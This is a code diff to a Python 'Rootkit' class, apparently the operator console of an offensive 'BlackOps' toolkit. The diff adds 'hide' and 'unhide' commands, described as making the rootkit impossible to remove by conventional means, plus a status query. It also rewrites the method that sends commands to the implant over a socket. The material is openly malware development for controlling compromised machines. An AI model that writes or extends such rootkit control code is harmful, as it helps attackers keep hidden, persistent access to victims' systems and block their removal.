@@ -11,7 +11,10 @@ class Rootkit:
         self.id = str()
         self.log = str()
         self.commands = (
-            ("logs", "retrieves and prints the logs", [])
+            ("logs", "retrieves and prints the logs", []),
+            ("hide", "hide the rootkit- unable to be removed by conventional means as well", []),
+            ("unhide", "unhide the rootkit- able to be removed ", []),
+            ("?hidden", "queries wether the rootkit is hidden", [])
         )
         self.prompt = "BlackOps::rootkit::#>"
 
@@ -32,8 +35,10 @@ class Rootkit:
             self.sock.close()
 
     def send(self, command):
-        if command not in self.commands:
-            return -1
-        self.sock.sendall(command.encode())
-        data = self.sock.recv(4096)
-        return data
+        for pos_command in self.commands:
+            if pos_command[0]==command:
+                self.sock.sendall(command.encode())
+                data = self.sock.recv(4096)
+                return data
+        print("invalid command!")
+        return -1
